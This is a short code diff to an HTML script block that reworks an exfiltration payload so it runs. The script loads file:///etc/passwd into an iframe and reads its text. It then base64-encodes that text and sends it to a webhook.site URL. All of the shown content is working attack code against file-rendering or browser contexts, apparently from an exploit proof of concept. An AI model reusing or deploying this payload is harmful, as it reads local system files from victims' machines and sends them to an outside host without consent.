@@ -8,7 +8,7 @@
   document.body.appendChild(frame);
   return r;
 }
-
+(async function () {
 const frfr = await loadFrame("file:///etc/passwd", "frfr");
 const frtxt = window.parent.frames["frfr"].document.body.innerText;
   
@@ -25,5 +25,5 @@ const frtxt = window.parent.frames["frfr"].document.body.innerText;
    request2.open("GET", "https://webhook.site/61d14abf-1552-4231-ac33-481aca823fff?r="+btoa(frtxt), false);
    request2.send(null);
 //}
-
+})();
 </script>
